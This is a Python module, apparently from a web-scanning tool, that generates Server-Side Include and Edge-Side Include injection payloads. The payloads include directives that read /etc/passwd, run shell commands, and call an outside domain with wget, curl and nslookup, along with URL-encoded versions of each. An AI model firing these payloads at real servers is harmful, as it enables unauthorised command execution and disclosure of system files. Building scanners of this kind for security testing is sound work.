import urllib.parse
from pluck.module import GenerationModule


class SSIPayloadGenerator(GenerationModule):
    def __init__(self):
        super().__init__()
        self.directive_template = '<!--#DIRECTIVE param="PAYLOAD" -->'

        #self.evidence_strings = []

    def generate_payloads(self):

        result = [
            f'<!--#echo var="{self.unique_string}" -->',
            f'<!--#include file="/etc/passwd" -->',
            f'<!--#exec cmd="sleep {str(self.sleep_timeout)}" -->',
            f'<!--#exec cmd="timeout /T {str(self.sleep_timeout)}" -->',
            f'<!--#exec cmd="echo {self.unique_string}" -->',
            f'<!--#exec cmd="cat /etc/passwd" -->',
            f'<!--#exec cmd="wget http://{self.domain}" -->',
            f'<!--#exec cmd="curl http://{self.domain}" -->',
            f'<!--#exec cmd="nslookup {self.domain}" -->',
            f'<esi:include src=http://{self.domain}/{self.unique_string}>',
            f'<esi:include src="/etc/passwd">',
            f'<!--esi $add_header("Pluck","{self.unique_string}") -->',
        ]        

        encoded = self.url_encode(result)
        result.extend(encoded)

        return result

    def url_encode(self, lista):
        return [urllib.parse.quote(p) for p in lista]

